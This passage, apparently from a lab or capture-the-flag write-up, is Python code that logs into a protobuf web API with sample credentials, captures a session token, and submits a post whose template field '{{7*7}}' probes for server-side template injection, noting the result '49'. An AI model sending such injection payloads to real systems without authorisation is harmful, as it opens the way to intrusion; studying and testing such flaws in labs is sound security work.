    r = requests.post(f"{BASE}/api/proto",
        data=req.SerializeToString(),
        headers={"Content-Type": "application/x-protobuf"})
    resp = ApiResponse()
    resp.ParseFromString(r.content)
    return resp

# Login and capture token
req = ApiRequest()
req.login.username = "alice"
req.login.password = "alice123"
resp = call(req)
token = resp.login_result.session_token
print("Token:", token)

# Create a post (session_token inside CreatePostRequest)
req2 = ApiRequest()
req2.post.session_token = token
req2.post.post.title    = "SSTI Test"
req2.post.post.body     = "&lt;p&gt;test&lt;/p&gt;"
req2.post.post.template = "{{7*7}}"
req2.post.post.category = "Test"
req2.post.post.published = True
resp2 = call(req2)
print(resp2.message)   # SSTI rendered: "49"</pre>
